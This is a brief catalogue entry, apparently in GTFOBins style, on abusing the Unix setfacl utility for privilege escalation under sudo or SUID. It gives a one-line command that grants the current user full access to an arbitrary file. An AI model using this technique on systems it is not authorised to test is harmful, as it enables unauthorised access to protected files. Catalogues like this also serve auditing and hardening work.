---
type: gtfobin
name: setfacl
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# setfacl

## privilege-escalation

```bash
setfacl -m u:$(id -un):rwx /path/to/input-file
```
_This can be run with elevated privileges to change ownership and then read, write, or execute a file._
**Contexts:** sudo, suid
